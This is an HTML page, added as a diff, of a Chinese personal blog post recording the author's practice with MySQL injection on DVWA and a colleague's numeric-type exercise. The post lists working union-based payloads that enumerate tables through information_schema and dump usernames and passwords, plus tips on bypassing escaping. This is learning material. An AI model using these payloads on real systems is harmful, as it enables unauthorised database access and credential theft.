@@ -1,0 +1,772 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="MySQL,SQL注入," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Mysql注入练习了两个题，一个是DVWA的字符型sql注入，一个是优秀同事发的数字型sql注入。 1、判断是否存在sql注入点和sql注入类型1.1理论上只要与数据库有交互的点都存在sql注入可能1.2现在我掌握的只有最简单的单引号判断法原理：如果正常输入的话单引号应该刚刚好，如果加上单引号就会造成不匹配报错这里还要注意有的报错不代表存在sql注入漏洞，比如5xx是服务器错误 1.3 sql注入">
+<meta name="keywords" content="MySQL,SQL注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MySQL注入的学习记录">
+<meta property="og:url" content="http://yoursite.com/2021/01/20/MySQL注入学习记录/index.html">
+<meta property="og:site_name" content="estrella">
+<meta property="og:description" content="Mysql注入练习了两个题，一个是DVWA的字符型sql注入，一个是优秀同事发的数字型sql注入。 1、判断是否存在sql注入点和sql注入类型1.1理论上只要与数据库有交互的点都存在sql注入可能1.2现在我掌握的只有最简单的单引号判断法原理：如果正常输入的话单引号应该刚刚好，如果加上单引号就会造成不匹配报错这里还要注意有的报错不代表存在sql注入漏洞，比如5xx是服务器错误 1.3 sql注入">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://a1.qpic.cn/psc?/V11V3soz2JNi4c/ruAMsa53pVQWN7FLK88i5oCG3pZkbCoVy.ijrLn28QQBsV71TUYWymU27m9Oe5s6sK5KMo3s6GCmjOQX*kWd85ecU*5HhuByu7WGae9MjZg!/m&ek=1&kp=1&pt=0&bo=KgJeAAAAAAABF0Y!&t=5&tl=3&vuin=3033668267&tm=1611104400&sce=60-3-3&rf=0-0">
+<meta property="og:image" content="http://a1.qpic.cn/psc?/V11V3soz2JNi4c/ruAMsa53pVQWN7FLK88i5oCG3pZkbCoVy.ijrLn28QSRFRX*7Dyq8KR2mM1.vZi7xjpuhKNfbd1QdixI0qWs5xmYK1unBzMLwR*KsY6MWOg!/m&ek=1&kp=1&pt=0&bo=tgH8AAAAAAABF3s!&t=5&tl=3&vuin=3033668267&tm=1611104400&sce=60-4-3&rf=0-0">
+<meta property="og:image" content="http://a1.qpic.cn/psc?/V11V3soz2JNi4c/ruAMsa53pVQWN7FLK88i5u5FnaAUH19KKc1aiIdB7YmDop.2Rts*vZs9Y2ZUDHHJqafaZnVgkNXiL9QGiLHUd3RRXv0ji.AWI8uFwuo0Y50!/m&ek=1&kp=1&pt=0&bo=ZQTOAAAAAAABF58!&t=5&tl=3&vuin=3033668267&tm=1611104400&sce=60-4-3&rf=0-0">
+<meta property="og:image" content="http://a1.qpic.cn/psc?/V11V3soz2JNi4c/ruAMsa53pVQWN7FLK88i5u5FnaAUH19KKc1aiIdB7Ykcca5SXGCxDJyEer22X2MwBMdMHzpCoFWDMLMGoUZJswsUZvO5J.k1*q2TkWk0i4E!/m&ek=1&kp=1&pt=0&bo=0wInAAAAAAABF8Y!&t=5&tl=3&vuin=3033668267&tm=1611104400&sce=60-3-3&rf=0-0">
+<meta property="og:image" content="http://a1.qpic.cn/psc?/V11V3soz2JNi4c/ruAMsa53pVQWN7FLK88i5u5FnaAUH19KKc1aiIdB7YlWyeQYvjHwgbZ2yDJoTW8YuIFRiLpA6DI9NEYRdSRmszfEjPOEKZsAOOTPF0Meyzg!/m&ek=1&kp=1&pt=0&bo=0ANmAQAAAAABF4Q!&t=5&tl=3&vuin=3033668267&tm=1611104400&sce=60-4-3&rf=0-0">
+<meta property="og:image" content="http://a1.qpic.cn/psc?/V11V3soz2JNi4c/ruAMsa53pVQWN7FLK88i5u5FnaAUH19KKc1aiIdB7YmpVDLVExmSAalpK3i6hm9FlGAt9kb7Lm7fVLTP.ShaE1QqLmK9BWFuaokf1NCCnS0!/m&ek=1&kp=1&pt=0&bo=aQJuAgAAAAABFzc!&t=5&tl=3&vuin=3033668267&tm=1611104400&sce=60-4-3&rf=0-0">
+<meta property="og:image" content="http://a1.qpic.cn/psc?/V11V3soz2JNi4c/ruAMsa53pVQWN7FLK88i5lnIQRLxfsvngMOPkYgCEuOSlvGRg2jZ5jQO85MhKcV5WX9v6Q*FOTsw6XMuFLKI4nd1.Tnpw2mqh1DYlqJQo1I!/m&ek=1&kp=1&pt=0&bo=ZQP9AQAAAAABF6o!&t=5&tl=3&vuin=3033668267&tm=1611104400&sce=60-4-3&rf=0-0">
+<meta property="og:updated_time" content="2021-01-20T02:34:58.469Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="MySQL注入的学习记录">
+<meta name="twitter:description" content="Mysql注入练习了两个题，一个是DVWA的字符型sql注入，一个是优秀同事发的数字型sql注入。 1、判断是否存在sql注入点和sql注入类型1.1理论上只要与数据库有交互的点都存在sql注入可能1.2现在我掌握的只有最简单的单引号判断法原理：如果正常输入的话单引号应该刚刚好，如果加上单引号就会造成不匹配报错这里还要注意有的报错不代表存在sql注入漏洞，比如5xx是服务器错误 1.3 sql注入">
+<meta name="twitter:image" content="http://a1.qpic.cn/psc?/V11V3soz2JNi4c/ruAMsa53pVQWN7FLK88i5oCG3pZkbCoVy.ijrLn28QQBsV71TUYWymU27m9Oe5s6sK5KMo3s6GCmjOQX*kWd85ecU*5HhuByu7WGae9MjZg!/m&ek=1&kp=1&pt=0&bo=KgJeAAAAAAABF0Y!&t=5&tl=3&vuin=3033668267&tm=1611104400&sce=60-3-3&rf=0-0">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2021/01/20/MySQL注入学习记录/"/>
+
+
+
+
+
+  <title>MySQL注入的学习记录 | estrella</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?8dbeab8043ac95c74425ba3f8175d020";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">estrella</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">I can always be what I want to be.</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/01/20/MySQL注入学习记录/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="estrella">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="estrella">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">MySQL注入的学习记录</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-01-20T00:00:00+08:00">
+                2021-01-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/网络安全/" itemprop="url" rel="index">
+                    <span itemprop="name">网络安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>Mysql注入练习了两个题，一个是DVWA的字符型sql注入，一个是优秀同事发的数字型sql注入。</p>
+<h1 id="1、判断是否存在sql注入点和sql注入类型"><a href="#1、判断是否存在sql注入点和sql注入类型" class="headerlink" title="1、判断是否存在sql注入点和sql注入类型"></a>1、判断是否存在sql注入点和sql注入类型</h1><h2 id="1-1理论上只要与数据库有交互的点都存在sql注入可能"><a href="#1-1理论上只要与数据库有交互的点都存在sql注入可能" class="headerlink" title="1.1理论上只要与数据库有交互的点都存在sql注入可能"></a>1.1理论上只要与数据库有交互的点都存在sql注入可能</h2><h2 id="1-2现在我掌握的只有最简单的单引号判断法"><a href="#1-2现在我掌握的只有最简单的单引号判断法" class="headerlink" title="1.2现在我掌握的只有最简单的单引号判断法"></a>1.2现在我掌握的只有最简单的单引号判断法</h2><p>原理：如果正常输入的话单引号应该刚刚好，如果加上单引号就会造成不匹配报错<br>这里还要注意有的报错<em>不代表存在</em>sql注入漏洞，比如5xx是服务器错误</p>
+<h2 id="1-3-sql注入类型"><a href="#1-3-sql注入类型" class="headerlink" title="1.3 sql注入类型"></a>1.3 sql注入类型</h2><p>字符型</p>
+<pre><code>?id=1’ and ‘1’=’1返回正常
+?id=1’ and ’1’=’2报错
+</code></pre><p>可知存在字符型SQL注入<br>数字型:<br>如果</p>
+<pre><code>?id=1 and 1=1返回正常
+?id=1 and 1=2报错
+</code></pre><p>可知存在数字型SQL注入</p>
+<h1 id="2、判断sql查询返回表的字段数与回显位置"><a href="#2、判断sql查询返回表的字段数与回显位置" class="headerlink" title="2、判断sql查询返回表的字段数与回显位置"></a>2、判断sql查询返回表的字段数与回显位置</h1><h2 id="2-1利用order-by-语句判断返回表的字段数"><a href="#2-1利用order-by-语句判断返回表的字段数" class="headerlink" title="2.1利用order by 语句判断返回表的字段数"></a>2.1利用order by 语句判断返回表的字段数</h2><pre><code>1&apos; order by 2#
+</code></pre><p><img src="http://a1.qpic.cn/psc?/V11V3soz2JNi4c/ruAMsa53pVQWN7FLK88i5oCG3pZkbCoVy.ijrLn28QQBsV71TUYWymU27m9Oe5s6sK5KMo3s6GCmjOQX*kWd85ecU*5HhuByu7WGae9MjZg!/m&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=KgJeAAAAAAABF0Y!&amp;t=5&amp;tl=3&amp;vuin=3033668267&amp;tm=1611104400&amp;sce=60-3-3&amp;rf=0-0" alt="orderby"></p>
+<h2 id="2-2判断回显位置"><a href="#2-2判断回显位置" class="headerlink" title="2.2判断回显位置"></a>2.2判断回显位置</h2><p>用order by判断字段数后，用优秀同事发给我的90sec火狐浏览器生成查询语句<br><img src="http://a1.qpic.cn/psc?/V11V3soz2JNi4c/ruAMsa53pVQWN7FLK88i5oCG3pZkbCoVy.ijrLn28QSRFRX*7Dyq8KR2mM1.vZi7xjpuhKNfbd1QdixI0qWs5xmYK1unBzMLwR*KsY6MWOg!/m&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=tgH8AAAAAAABF3s!&amp;t=5&amp;tl=3&amp;vuin=3033668267&amp;tm=1611104400&amp;sce=60-4-3&amp;rf=0-0" alt="select"><br>判断得第几个字段存在回显</p>
+<h1 id="3、查询当前数据库database-、当前用户user-、版本version-等的信息"><a href="#3、查询当前数据库database-、当前用户user-、版本version-等的信息" class="headerlink" title="3、查询当前数据库database()、当前用户user()、版本version()等的信息"></a>3、查询当前数据库database()、当前用户user()、版本version()等的信息</h1><pre><code>1&apos; union select version(),database()#
+</code></pre><p>查询存储元数据的数据库里的所有表名<br>Information_schema的information_schema.table和information_schema.column<br>table_schema中存的是所有数据库的名称<br>table_name中存的是所有数据表的名称<br>column_name中存的是所有字段的名字<br>那么查询语句是</p>
+<pre><code>1&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#
+</code></pre><p><img src="http://a1.qpic.cn/psc?/V11V3soz2JNi4c/ruAMsa53pVQWN7FLK88i5u5FnaAUH19KKc1aiIdB7YmDop.2Rts*vZs9Y2ZUDHHJqafaZnVgkNXiL9QGiLHUd3RRXv0ji.AWI8uFwuo0Y50!/m&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=ZQTOAAAAAAABF58!&amp;t=5&amp;tl=3&amp;vuin=3033668267&amp;tm=1611104400&amp;sce=60-4-3&amp;rf=0-0" alt="select"></p>
+<pre><code>1&apos; union select 1, group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;#
+</code></pre><p>Group_concat的作用是以id分组，把price字段的值在同一行打印出来，逗号分隔(默认)<br><img src="http://a1.qpic.cn/psc?/V11V3soz2JNi4c/ruAMsa53pVQWN7FLK88i5u5FnaAUH19KKc1aiIdB7Ykcca5SXGCxDJyEer22X2MwBMdMHzpCoFWDMLMGoUZJswsUZvO5J.k1*q2TkWk0i4E!/m&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=0wInAAAAAAABF8Y!&amp;t=5&amp;tl=3&amp;vuin=3033668267&amp;tm=1611104400&amp;sce=60-3-3&amp;rf=0-0" alt="group"><br>如果去掉了group_concat函数，那么回显如下<br><img src="http://a1.qpic.cn/psc?/V11V3soz2JNi4c/ruAMsa53pVQWN7FLK88i5u5FnaAUH19KKc1aiIdB7YlWyeQYvjHwgbZ2yDJoTW8YuIFRiLpA6DI9NEYRdSRmszfEjPOEKZsAOOTPF0Meyzg!/m&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=0ANmAQAAAAABF4Q!&amp;t=5&amp;tl=3&amp;vuin=3033668267&amp;tm=1611104400&amp;sce=60-4-3&amp;rf=0-0" alt="group"><br>注意这里不用加上group by 是因为只有1，如果别的情况不加group by的话，数据就会被第一个覆盖掉</p>
+<h1 id="4、最后就是获得字段中的数据了"><a href="#4、最后就是获得字段中的数据了" class="headerlink" title="4、最后就是获得字段中的数据了"></a>4、最后就是获得字段中的数据了</h1><pre><code>1&apos; union select user,password from users#
+</code></pre><p><img src="http://a1.qpic.cn/psc?/V11V3soz2JNi4c/ruAMsa53pVQWN7FLK88i5u5FnaAUH19KKc1aiIdB7YmpVDLVExmSAalpK3i6hm9FlGAt9kb7Lm7fVLTP.ShaE1QqLmK9BWFuaokf1NCCnS0!/m&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=aQJuAgAAAAABFzc!&amp;t=5&amp;tl=3&amp;vuin=3033668267&amp;tm=1611104400&amp;sce=60-4-3&amp;rf=0-0" alt="group"></p>
+<pre><code>1&apos; union select group_concat(user), password from users group by password#
+</code></pre><p><img src="http://a1.qpic.cn/psc?/V11V3soz2JNi4c/ruAMsa53pVQWN7FLK88i5lnIQRLxfsvngMOPkYgCEuOSlvGRg2jZ5jQO85MhKcV5WX9v6Q*FOTsw6XMuFLKI4nd1.Tnpw2mqh1DYlqJQo1I!/m&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=ZQP9AQAAAAABF6o!&amp;t=5&amp;tl=3&amp;vuin=3033668267&amp;tm=1611104400&amp;sce=60-4-3&amp;rf=0-0" alt="group"></p>
+<h1 id="5、其他值得注意的点"><a href="#5、其他值得注意的点" class="headerlink" title="5、其他值得注意的点"></a>5、其他值得注意的点</h1><h2 id="5-1如果单引号被转义，用16进制绕过"><a href="#5-1如果单引号被转义，用16进制绕过" class="headerlink" title="5.1如果单引号被转义，用16进制绕过"></a>5.1如果单引号被转义，用16进制绕过</h2><h2 id="5-2如果像DVWA-medium那样只能选择数字，就用burpsuite绕过"><a href="#5-2如果像DVWA-medium那样只能选择数字，就用burpsuite绕过" class="headerlink" title="5.2如果像DVWA medium那样只能选择数字，就用burpsuite绕过"></a>5.2如果像DVWA medium那样只能选择数字，就用burpsuite绕过</h2>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/MySQL/" rel="tag"># MySQL</a>
+          
+            <a href="/tags/SQL注入/" rel="tag"># SQL注入</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/07/03/matlab开发stm32初学笔记/" rel="next" title="matlab开发stm32初学笔记">
+                <i class="fa fa-chevron-left"></i> matlab开发stm32初学笔记
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">estrella</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">51</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">52</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1、判断是否存在sql注入点和sql注入类型"><span class="nav-number">1.</span> <span class="nav-text">1、判断是否存在sql注入点和sql注入类型</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-1理论上只要与数据库有交互的点都存在sql注入可能"><span class="nav-number">1.1.</span> <span class="nav-text">1.1理论上只要与数据库有交互的点都存在sql注入可能</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-2现在我掌握的只有最简单的单引号判断法"><span class="nav-number">1.2.</span> <span class="nav-text">1.2现在我掌握的只有最简单的单引号判断法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-3-sql注入类型"><span class="nav-number">1.3.</span> <span class="nav-text">1.3 sql注入类型</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2、判断sql查询返回表的字段数与回显位置"><span class="nav-number">2.</span> <span class="nav-text">2、判断sql查询返回表的字段数与回显位置</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1利用order-by-语句判断返回表的字段数"><span class="nav-number">2.1.</span> <span class="nav-text">2.1利用order by 语句判断返回表的字段数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2判断回显位置"><span class="nav-number">2.2.</span> <span class="nav-text">2.2判断回显位置</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3、查询当前数据库database-、当前用户user-、版本version-等的信息"><span class="nav-number">3.</span> <span class="nav-text">3、查询当前数据库database()、当前用户user()、版本version()等的信息</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4、最后就是获得字段中的数据了"><span class="nav-number">4.</span> <span class="nav-text">4、最后就是获得字段中的数据了</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#5、其他值得注意的点"><span class="nav-number">5.</span> <span class="nav-text">5、其他值得注意的点</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#5-1如果单引号被转义，用16进制绕过"><span class="nav-number">5.1.</span> <span class="nav-text">5.1如果单引号被转义，用16进制绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-2如果像DVWA-medium那样只能选择数字，就用burpsuite绕过"><span class="nav-number">5.2.</span> <span class="nav-text">5.2如果像DVWA medium那样只能选择数字，就用burpsuite绕过</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">estrella</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+</body>
+</html>
